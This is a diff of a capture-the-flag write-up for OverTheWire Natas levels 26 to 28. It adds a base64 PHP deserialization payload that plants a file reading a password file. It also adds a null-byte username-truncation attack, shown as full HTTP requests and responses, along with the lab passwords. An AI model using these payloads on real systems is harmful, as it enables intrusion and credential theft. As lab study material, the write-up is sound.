+the modified output obtained is `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTI6Ijw/cGhwIHBhc3N0aHJ1KGBjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjdgKTsgPz4iO30=`
+
+after changing the value, we got this error: 
+`Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105`
+
+then, navigate to `http://natas26.natas.labs.overthewire.org/img/test.php`. the password is obtained. 
+
 
 ### Analysis
 
@@ -3327,13 +4059,286 @@ After login, the following note is displayed:
 ```
 URL: http://natas27.natas.labs.overthewire.org
 Username: natas27
-Password: 
+Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
 ```
-After login, the following note is displayed: 
+After login, the webpage request for username and password input along with a login button. 
 
-### Approach 
+Below is the source code: 
+```
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+<?php
+
+// morla / 10111
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+for several attempt, we can conlcude that
+if the user is not exisit, this webpage is served as registration system to add username and password into the table. 
+else if user exist, if the password is correct, then login. else return wrong password. 
+
+cannot use the payload like " OR 1=1# cause the special character will treated as string also. 
+
+cannot create username like `natas28       ` cause will return go away hacker.
+
+based on the code, we can identify that the dumpData function only check for the username within the table without verifying the password. $query = "SELECT * from users where username='$user'";
+
+
+### Approach 
+to get the password for the natas28, we can insert the null character to make the username the same, becuase the null character will be trimmed. therefore, we just need to login using our own password created, and the retrieved will be the real user of natas28. 
+
+`natas28(null x64)a` as our username and use `a` as password. 
+
+use %00 as null as url encoding. and attempt to do this using burpsuite. 
+
+Modified request content: 
+```
+POST /index.php HTTP/1.1
+Host: natas27.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: http://natas27.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
+Connection: keep-alive
+Referer: http://natas27.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00a&password=a
+```
+
+Response content: 
+```
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 12:45:08 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 982
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+User natas28
+```
+
+page source of response: 
+```
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+User natas28 (...64 null characters...) a was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+after that, we try to relogin again using username=natas28&password=a 
+```
+POST /index.php HTTP/1.1
+Host: natas27.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: http://natas27.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
+Connection: keep-alive
+Referer: http://natas27.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+username=natas28&password=a
+```
+
+response content: 
+```
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 12:51:08 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1027
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+Welcome natas28!<br>Here is your data:<br>Array
+(
+    [username] =&gt; natas28
+    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+)
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Analysis
 
@@ -3344,7 +4349,7 @@ After login, the following note is displayed:
 ```
 URL: http://natas28.natas.labs.overthewire.org
 Username: natas28
-Password: 
+Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
 ```
 After login, the following note is displayed: 
 
